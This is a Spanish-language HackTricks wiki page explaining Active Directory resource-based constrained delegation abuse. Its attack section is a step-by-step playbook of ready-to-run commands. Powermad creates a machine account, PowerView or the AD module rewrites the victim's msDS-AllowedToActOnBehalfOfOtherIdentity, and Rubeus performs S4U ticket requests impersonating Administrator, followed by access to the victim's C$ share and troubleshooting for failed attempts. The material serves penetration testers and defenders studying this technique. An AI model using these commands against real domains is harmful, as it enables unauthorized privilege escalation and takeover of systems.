# Delegación restringida basada en recursos

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Conceptos básicos de la delegación restringida basada en recursos

Esto es similar a la [Delegación restringida](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario frente a un servicio**. La Delegación restringida basada en recursos **establece** en **el objeto quién puede suplantar a cualquier usuario frente a él**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario frente a él.

Otra diferencia importante de esta Delegación restringida con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (En las otras formas de Delegación se necesitaban privilegios de administrador de dominio).

### Nuevos conceptos

En la Delegación restringida se mencionó que la bandera **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no** será **Forwardable**.

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable** intentar abusar de una **Delegación restringida básica** no funcionará. Pero si estás intentando explotar una **delegación restringida basada en recursos, funcionará** (esto no es una vulnerabilidad, es una característica, aparentemente).

### Estructura del ataque

> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora** puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre la computadora víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Administrador_ sin ningún otro privilegio especial puede **crear** hasta 10 **objetos de Computadora (**_**MachineAccountQuota**_**)** y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación restringida basada en recursos para permitir que ServicioA suplante a cualquier usuario** frente a esa computadora víctima (ServicioB).
3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Servicio A a Servicio B para un usuario **con acceso privilegiado a Servicio B**.
1. S4U2Self (desde la cuenta comprometida/creada con SPN): Solicita un **TGS de Administrador para mí** (No Forwardable).
2. S4U2Proxy: Utiliza el **TGS no Forwardable** del paso anterior para solicitar un **TGS** de **Administrador** a la **máquina víctima**.
3. Incluso si estás utilizando un TGS no Forwardable, como estás explotando la delegación restringida basada en recursos, funcionará.
4. El atacante puede **pasar el ticket** e **impersonar** al usuario para obtener **acceso al ServicioB víctima**.

Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creación de un Objeto de Computadora

Puedes crear un objeto de computadora dentro del dominio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de la **Delegación restringida basada en recursos**

**Usando el módulo PowerShell de Active Directory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un ataque completo S4U

En primer lugar, creamos el nuevo objeto de Equipo con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, el ataque puede ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets simplemente preguntando una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Ten en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo como Verdadero, no podrás suplantarlo. Esta propiedad se puede ver dentro de bloodhound.
{% endhint %}

### Acceso

El último comando en la línea de comandos realizará el **ataque S4U completo e inyectará el TGS** de Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** de Administrator, por lo que podrás acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso de diferentes tickets de servicio

Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Errores de Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES o RC4 y estás suministrando solo el hash RC4. Suministra a Rubeus al menos el hash AES256 (o simplemente suministra los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es diferente a la del DC y Kerberos no está funcionando correctamente.
* **`preauth_failed`**: Esto significa que el nombre de usuario dado + hashes no funcionan para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Esto puede significar:
  * El usuario que estás intentando suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
  * El servicio solicitado no existe (si solicitas un ticket para winrm pero winrm no está en ejecución)
  * El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.

## Referencias

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende hacking de AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
